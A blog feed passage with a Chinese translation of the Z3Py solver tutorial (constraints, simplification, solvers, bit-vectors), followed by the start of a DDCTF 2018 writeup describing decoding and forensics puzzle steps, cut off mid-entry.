    <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>Z3Py感觉在逆向方面还是挺好用的，最近把教程看了一下，然后做一下翻译。</p><h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>这是Leonardo de Moura的Z3Py教程的归档版本。Sorig进行了语法的校对。</p><h3 id="python中的Z3-API"><a href="#python中的Z3-API" class="headerlink" title="python中的Z3 API"></a>python中的Z3 API</h3><p>Z3是Microsoft Research开发的高性能定理证明器。Z3拥有者非常广泛的应用场景：软件/硬件验证和测试，约束求解，混合系统分析，安全性研究，生物学研究（计算机分析）以及几何问题。</p><p>本教程演示了Z3Py的主要功能：Python中的Z3 API。阅读本教程不需要任何的Python知识。但是你学一下python对本教程的学习还是很有用的。</p><p>Z3发行版还包含了c,.net和OCaml的API。Z3Py的源码可以在Z3的发行版中获取，这方便通过修改源码满足你自己的特殊需求。源代码还演示了如何在Z3 4.0中使用新功能。Z3的前端包括Scala^Z3和SBV。</p><p>在跟随这些示例的时候一定要自己亲自演示一下代码。Z3Py表示：跑跑自己的脚本，搞搞自己的实验。</p><h3 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h3><p>先看看如下简单的一个示例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line">solve(x &gt; <span class="number">2</span>, y &lt; <span class="number">10</span>, x + <span class="number">2</span>*y == <span class="number">7</span>)</span><br></pre></td></tr></table></figure></p><p>Int(‘x’)功能是在Z3中创建了一个名为x的int变量。sovle函数用来解决该约束系统。上面的例子使用了两个变量x和y以及三个约束。在上面的例子中，表达式x+2*y==7是一个约束条件。Z3可以用来解决或者简化公式。</p><p>下面的例子展示了如何利用Z3公式/表达式简化器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line"><span class="keyword">print</span> simplify(x + y + <span class="number">2</span>*x + <span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> simplify(x &lt; y + x + <span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> simplify(And(x + <span class="number">1</span> &gt;= <span class="number">3</span>, x**<span class="number">2</span> + x**<span class="number">2</span> + y**<span class="number">2</span> + <span class="number">2</span> &gt;= <span class="number">5</span>))</span><br></pre></td></tr></table></figure></p><p>默认情况下，Z3Py(网页模式)使用数学符号显示公式和表达式。通常来说，∧是逻辑和，∨是逻辑或，等等。（html_mode=False）命令使所有公式和表达式以Z3Py表示法显示。这也是Z3发行版中Z3Py离线版本的默认模式。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line"><span class="keyword">print</span> x**<span class="number">2</span> + y**<span class="number">2</span> &gt;= <span class="number">1</span></span><br><span class="line">set_option(html_mode=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">print</span> x**<span class="number">2</span> + y**<span class="number">2</span> &gt;= <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>Z3提供了解析表达式的函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line">n = x + y &gt;= <span class="number">3</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"num args: "</span>, n.num_args()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"children: "</span>, n.children()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"1st child:"</span>, n.arg(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"2nd child:"</span>, n.arg(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"operator: "</span>, n.decl()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"op name:  "</span>, n.decl().name()</span><br></pre></td></tr></table></figure></p><p>Z3提供了所有基本的数学运算。Z3Py和Python运算符优先级是相同的。像Python一样，**是次方运算符。 Z3可以求解非线性多项式的约束方程。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = Real(<span class="string">'x'</span>)</span><br><span class="line">y = Real(<span class="string">'y'</span>)</span><br><span class="line">solve(x**<span class="number">2</span> + y**<span class="number">2</span> &gt; <span class="number">3</span>, x**<span class="number">3</span> + y &lt; <span class="number">5</span>)</span><br></pre></td></tr></table></figure></p><p>脚本利用Real(‘x’)来创建一个实数x。Z3Py可以表示任意大的整数，有理数和无理数。一个无理数是具有整数系数的多项式的根。Z3可以精确地表示这些数字。无理数以十进制表示法显示，以便我们读取结果。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x = Real(<span class="string">'x'</span>)</span><br><span class="line">y = Real(<span class="string">'y'</span>)</span><br><span class="line">solve(x**<span class="number">2</span> + y**<span class="number">2</span> == <span class="number">3</span>, x**<span class="number">3</span> == <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">set_option(precision=<span class="number">30</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Solving, and displaying result with 30 decimal places"</span></span><br><span class="line">solve(x**<span class="number">2</span> + y**<span class="number">2</span> == <span class="number">3</span>, x**<span class="number">3</span> == <span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><p>set_option 函数用来配置Z3的环境，比如结果的显示方式。set_option(precision=30)将小数点精度设置为30。上述脚本的结果中?表示的是输出被截断了。</p><p>以下示例演示了一个常见的错误。表达式3/2是一个Python整数，而不是Z3有理数。该示例还展示了在Z3Py中创建有理数的不同方法。Q（num，den）创建了一个Z3有理数，其中num是分子，den是分母。RealVal（1）创建一个表示数字1的Z3实数。</p><p>有理数也可以用十进制表示法显示。</p><p>约束方程式有时候可能没有解。 在这种情况下，我们说这个方程不可解。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = Real(<span class="string">'x'</span>)</span><br><span class="line">solve(x &gt; <span class="number">4</span>, x &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p>像在Python中一样，注释以＃开头，在行尾结束。 Z3Py不支持跨越多行的注释。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### This is a comment</span></span><br><span class="line">x = Real(<span class="string">'x'</span>) <span class="comment">### comment: creating x</span></span><br><span class="line"><span class="keyword">print</span> x**<span class="number">2</span> + <span class="number">2</span>*x + <span class="number">2</span>  <span class="comment">### comment: printing polynomial</span></span><br></pre></td></tr></table></figure></p><h3 id="布尔逻辑"><a href="#布尔逻辑" class="headerlink" title="布尔逻辑"></a>布尔逻辑</h3><p>Z3支持布尔运算符：And，Or，Not，Implies (逻辑蕴含)，If（if-then-else）。双蕴含使用==表示。以下示例展示如何解决一组简单的布尔约束。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = Bool(<span class="string">'p'</span>)</span><br><span class="line">q = Bool(<span class="string">'q'</span>)</span><br><span class="line">r = Bool(<span class="string">'r'</span>)</span><br><span class="line">solve(Implies(p, q), r == Not(q), Or(Not(p), r))</span><br></pre></td></tr></table></figure></p><p>Python布尔常量True和False可用于构建Z3布尔表达式。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = Bool(<span class="string">'p'</span>)</span><br><span class="line">q = Bool(<span class="string">'q'</span>)</span><br><span class="line"><span class="keyword">print</span> And(p, q, <span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">print</span> simplify(And(p, q, <span class="keyword">True</span>))</span><br><span class="line"><span class="keyword">print</span> simplify(And(p, <span class="keyword">False</span>))</span><br></pre></td></tr></table></figure></p><p>以下示例使用多项式和布尔约束的组合。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p = Bool(<span class="string">'p'</span>)</span><br><span class="line">x = Real(<span class="string">'x'</span>)</span><br><span class="line">solve(Or(x &lt; <span class="number">5</span>, x &gt; <span class="number">10</span>), Or(p, x**<span class="number">2</span> == <span class="number">2</span>), Not(p))</span><br></pre></td></tr></table></figure></p><h3 id="求解器"><a href="#求解器" class="headerlink" title="求解器"></a>求解器</h3><p>Z3提供了不同的求解器。在前面的示例中，solve函数的实现利用了Z3求解器的API。该实现可以在Z3发行版的z3.py文件中找到。以下示例演示了基本的Solver API。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"></span><br><span class="line">s.add(x &gt; <span class="number">10</span>, y == x + <span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Solving constraints in the solver s ..."</span></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Create a new scope..."</span></span><br><span class="line">s.push()</span><br><span class="line">s.add(y &lt; <span class="number">11</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Solving updated set of constraints..."</span></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Restoring state..."</span></span><br><span class="line">s.pop()</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Solving restored set of constraints..."</span></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br></pre></td></tr></table></figure></p><p>Solver()命令创建一个通用求解器。我们可以通过add函数添加约束条件。我们称之为声明约束条件。check()函数解决声明的约束条件，sat结果表示找到某个合适的解，unsat结果表示没有解。这时候我们称约束系统无解。最后，求解器可能无法解决约束系统并返回未知作为结果。<br>在一些应用场景中，我们可能需要保持一些约束条件不变，只需要更改部分约束条件。我们可以使用push和pop两个函数来做这件事情。每一个求解器都维持着一个的断言（感觉这里的意思是约束条件）栈，命令push通过保存当前堆栈大小来创建一个新的作用域。命令pop删除它与上一个push之间执行的任何条件约束。check始终对求解器的约束条件堆栈的内容进行操作。（感觉有点儿拗口，但是仔细观察代码就能明白pop和push的意思了）</p><p>下面展示一个Z3无法解决的示例。在下面的场景中求解器会返回unknow。因为Z3可以解决非线性多项式约束，但是2**x并不是多项式。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = Real(<span class="string">'x'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">2</span>**x == <span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> s.check()</span><br></pre></td></tr></table></figure></p><p>以下示例展现了如何遍历求解器中的约束条件，还有如何收集check的性能数据信息等。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">x = Real(<span class="string">'x'</span>)</span><br><span class="line">y = Real(<span class="string">'y'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x &gt; <span class="number">1</span>, y &gt; <span class="number">1</span>, Or(x + y &gt; <span class="number">3</span>, x - y &lt; <span class="number">2</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"asserted constraints..."</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s.assertions():</span><br><span class="line">    <span class="keyword">print</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"statistics for the last check method..."</span></span><br><span class="line"><span class="keyword">print</span> s.statistics()</span><br><span class="line"><span class="comment">### Traversing statistics</span></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> s.statistics():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%s : %s"</span> % (k, v)</span><br></pre></td></tr></table></figure></p><p>Z3会在找到合适解的时候返回sat。我们认为Z3能够满足这些约束条件并得到解决方案。该解决方案被看做一组解决约束条件的模型。模型能够使求解器中的每个约束条件都成立。以下示例显示了检测模型中数据的基本方法。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x, y, z = Reals(<span class="string">'x y z'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x &gt; <span class="number">1</span>, y &gt; <span class="number">1</span>, x + y &gt; <span class="number">3</span>, z - x &lt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line"></span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"x = %s"</span> % m[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"traversing model..."</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%s = %s"</span> % (d.name(), m[d])</span><br></pre></td></tr></table></figure></p><p>上述例子中， Reals(‘x y z’) 创建了x,y,z三个实数，如下脚本的简化版本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = Real(<span class="string">'x'</span>)</span><br><span class="line">y = Real(<span class="string">'y'</span>)</span><br><span class="line">z = Real(<span class="string">'z'</span>)</span><br></pre></td></tr></table></figure></p><p>m[x]表达式返回模型m中x的值，”%s = %s” % (d.name(), m[d])返回一个字符串，其中第一个%s被d的名称所取代，第二个%s被d的值取代，Z3Py在需要时会自动将Z3对象转换为文本表示。</p><h3 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h3><p>Z3支持实数和整数变量， 在单个问题中可能两者兼备。和大多数编程语言一样，Z3Py会自动添加强制转换，在需要时会将整数表达式转换为真正的表达式。以下示例演示声明整数和实数变量的不同方法。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x = Real(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line">a, b, c = Reals(<span class="string">'a b c'</span>)</span><br><span class="line">s, r = Ints(<span class="string">'s r'</span>)</span><br><span class="line"><span class="keyword">print</span> x + y + <span class="number">1</span> + (a + s)</span><br><span class="line"><span class="keyword">print</span> ToReal(y) + c</span><br></pre></td></tr></table></figure></p><p>函数ToReal将整型表达式转换为实数型表达式。<br>Z3Py支持所有基本的算术运算。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = Ints(<span class="string">'a b c'</span>)</span><br><span class="line">d, e = Reals(<span class="string">'d e'</span>)</span><br><span class="line">solve(a &gt; b + <span class="number">2</span>,</span><br><span class="line">      a == <span class="number">2</span>*c + <span class="number">10</span>,</span><br><span class="line">      c + b &lt;= <span class="number">1000</span>,</span><br><span class="line">      d &gt;= e)</span><br></pre></td></tr></table></figure></p><p>simplify函数对Z3表达式进行简单的转换。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x, y = Reals(<span class="string">'x y'</span>)</span><br><span class="line"><span class="comment">### Put expression in sum-of-monomials form</span></span><br><span class="line">t = simplify((x + y)**<span class="number">3</span>, som=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">print</span> t</span><br><span class="line"><span class="comment">### Use power operator</span></span><br><span class="line">t = simplify(t, mul_to_power=<span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">print</span> t</span><br></pre></td></tr></table></figure></p><p>help<em>simplify（）打印所有可用选项。Z3Py允许用户以两种风格书写选项。Z3默认选项是名称以：开头，单词之间用 - 分隔。Z3Py还支持类似Python的名称，其中：被省略了并且-被</em>替换。以下示例演示如何使用这两种样式。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x, y = Reals(<span class="string">'x y'</span>)</span><br><span class="line"><span class="comment">### Using Z3 native option names</span></span><br><span class="line"><span class="keyword">print</span> simplify(x == y + <span class="number">2</span>, <span class="string">':arith-lhs'</span>, <span class="keyword">True</span>)</span><br><span class="line"><span class="comment">### Using Z3Py option names</span></span><br><span class="line"><span class="keyword">print</span> simplify(x == y + <span class="number">2</span>, arith_lhs=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nAll available options:"</span></span><br><span class="line">help_simplify()</span><br></pre></td></tr></table></figure></p><p>Z3Py支持任意大的数字。 以下示例演示如何使用较大的整数，有理数和无理数执行基本算术。Z3Py仅支持代数无理数。因为无理数对于表达多项式方程的解来说已经足够了。Z3Py将始终以十进制符号显示无理数，因为它更方便阅读。我们可以使用sexpr（）方法提取更深层次的表达式。它将以s表达式（Lisp-like）的形式显示数学公式。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x, y = Reals(<span class="string">'x y'</span>)</span><br><span class="line">solve(x + <span class="number">10000000000000000000000</span> == y, y &gt; <span class="number">20000000000000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> Sqrt(<span class="number">2</span>) + Sqrt(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">print</span> simplify(Sqrt(<span class="number">2</span>) + Sqrt(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">print</span> simplify(Sqrt(<span class="number">2</span>) + Sqrt(<span class="number">3</span>)).sexpr()</span><br><span class="line"><span class="comment">### The sexpr() method is available for any Z3 expression</span></span><br><span class="line"><span class="keyword">print</span> (x + Sqrt(y) * <span class="number">2</span>).sexpr()</span><br></pre></td></tr></table></figure></p><h3 id="机器运算"><a href="#机器运算" class="headerlink" title="机器运算"></a>机器运算</h3><p>现代CPU和主流编程语言使用固定大小的位向量进行算术运算。同样在Z3Py中可以使用Bit_Vectors进行机器运算。它们能够实现无符号和有符号二进制运算。<br>以下示例展示如何创建位向量变量和常量。<br>函数BitVec（’x’，16）在Z3中创建一个位向量变量，名称为x，16位。为了方便起见，可以使用整型常量在Z3Py中创建位向量表达式。函数BitVecVal（10,32）创建一个大小为32的位向量，其值为10。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">x = BitVec(<span class="string">'x'</span>, <span class="number">16</span>)</span><br><span class="line">y = BitVec(<span class="string">'y'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> x + <span class="number">2</span></span><br><span class="line"><span class="comment">### Internal representation</span></span><br><span class="line"><span class="keyword">print</span> (x + <span class="number">2</span>).sexpr()</span><br><span class="line"></span><br><span class="line"><span class="comment">### -1 is equal to 65535 for 16-bit integers </span></span><br><span class="line"><span class="keyword">print</span> simplify(x + y - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Creating bit-vector constants</span></span><br><span class="line">a = BitVecVal(<span class="number">-1</span>, <span class="number">16</span>)</span><br><span class="line">b = BitVecVal(<span class="number">65535</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> simplify(a == b)</span><br><span class="line"></span><br><span class="line">a = BitVecVal(<span class="number">-1</span>, <span class="number">32</span>)</span><br><span class="line">b = BitVecVal(<span class="number">65535</span>, <span class="number">32</span>)</span><br><span class="line"><span class="comment">### -1 is not equal to 65535 for 32-bit integers </span></span><br><span class="line"><span class="keyword">print</span> simplify(a == b)</span><br></pre></td></tr></table></figure></p><p>与C，C ++，C＃，Java等编程语言相比，有符号位和无符号位向量作为数字的时候在Z3Py中没有区别。Z3为符号数运算提供了一个特殊的运算符操作版本，其中运算符&lt;，&lt;=，&gt;，&gt; =，/，％和&gt;&gt;对应于有符号运算。 相应的无符号运算符是ULT，ULE，UGT，UGE，UDiv，URem和LShR。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### Create to bit-vectors of size 32</span></span><br><span class="line">x, y = BitVecs(<span class="string">'x y'</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">solve(x + y == <span class="number">2</span>, x &gt; <span class="number">0</span>, y &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Bit-wise operators</span></span><br><span class="line"><span class="comment">### &amp; bit-wise and</span></span><br><span class="line"><span class="comment">### | bit-wise or</span></span><br><span class="line"><span class="comment">### ~ bit-wise not</span></span><br><span class="line">solve(x &amp; y == ~y)</span><br><span class="line"></span><br><span class="line">solve(x &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### using unsigned version of &lt; </span></span><br><span class="line">solve(ULT(x, <span class="number">0</span>))</span><br></pre></td></tr></table></figure></p><p>运算符&gt;&gt;是算术右移，&lt;&lt;是左移。 逻辑右移为LShR。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### Create to bit-vectors of size 32</span></span><br><span class="line">x, y = BitVecs(<span class="string">'x y'</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">solve(x &gt;&gt; <span class="number">2</span> == <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">solve(x &lt;&lt; <span class="number">2</span> == <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">solve(x &lt;&lt; <span class="number">2</span> == <span class="number">24</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h3&gt;&lt;p&gt;Z3Py感觉在逆向方面还是挺好用的，最近把教程看了一下，然后做一下翻译。&lt;/p&gt;
&lt;h3 id=&quot;致谢&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ddctf2018-部分writeup</title>
    <link href="https://foyjog.github.io/2018/04/20/ddctf2018-%E9%83%A8%E5%88%86writeup/"/>
    <id>https://foyjog.github.io/2018/04/20/ddctf2018-部分writeup/</id>
    <published>2018-04-20T06:32:29.000Z</published>
    <updated>2018-07-03T08:17:47.831Z</updated>
    
    <content type="html"><![CDATA[<h3 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h3><p>想了很久，对着发呆了一天，然后试了下偏移解码。。。然后就对了，每个十六进制减去128即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">result = [<span class="number">0xd4</span>,<span class="number">0xe8</span>,<span class="number">0xe1</span>,<span class="number">0xf4</span>,<span class="number">0xa0</span>,<span class="number">0xf7</span>,<span class="number">0xe1</span>,<span class="number">0xf3</span>,<span class="number">0xa0</span>,<span class="number">0xe6</span>,<span class="number">0xe1</span>,<span class="number">0xf3</span>,<span class="number">0xf4</span>,<span class="number">0xa1</span>,<span class="number">0xa0</span>,<span class="number">0xd4</span>,<span class="number">0xe8</span>,<span class="number">0xe5</span>,<span class="number">0xa0</span>,<span class="number">0xe6</span>,<span class="number">0xec</span>,<span class="number">0xe1</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xe9</span>,<span class="number">0xf3</span>,<span class="number">0xba</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc4</span>,<span class="number">0xc3</span>,<span class="number">0xd4</span>,<span class="number">0xc6</span>,<span class="number">0xfb</span>,<span class="number">0xb9</span>,<span class="number">0xb2</span>,<span class="number">0xb2</span>,<span class="number">0xe1</span>,<span class="number">0xe2</span>,<span class="number">0xb9</span>,<span class="number">0xb9</span>,<span class="number">0xb7</span>,<span class="number">0xb4</span>,<span class="number">0xe1</span>,<span class="number">0xb4</span>,<span class="number">0xb7</span>,<span class="number">0xe3</span>,<span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0xb2</span>,<span class="number">0xb2</span>,<span class="number">0xe3</span>,<span class="number">0xe6</span>,<span class="number">0xb4</span>,<span class="number">0xb3</span>,<span class="number">0xe2</span>,<span class="number">0xb5</span>,<span class="number">0xb0</span>,<span class="number">0xb6</span>,<span class="number">0xb1</span>,<span class="number">0xb0</span>,<span class="number">0xe6</span>,<span class="number">0xe1</span>,<span class="number">0xe5</span>,<span class="number">0xe1</span>,<span class="number">0xb5</span>,<span class="number">0xfd</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="keyword">print</span> chr(i<span class="number">-128</span>),</span><br></pre></td></tr></table></figure><h3 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h3><p>题目有混淆，一开始以为文件中的The fourth extended filesystem是提示，当然也是正确的，可以通过把这个ext4文件dd出来，然后挂载，可以得到文件file.zip，但是一直以为是恢复文件啥的来获取密码，搞了好久看题目的意思才想到密码在备注中。。。（Pactera），解压得到file.txt文件，打开全是字母，根据题目提示日常违规审计中频次有时候非常重要，计算文件中每个字母的频次，然后排序，得到flag。</p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>提示为</p><blockquote><p>提示二：注意补齐私钥格式—–BEGIN RSA PRIVATE KEY—–XXXXXXX—–END RSA PRIVATE 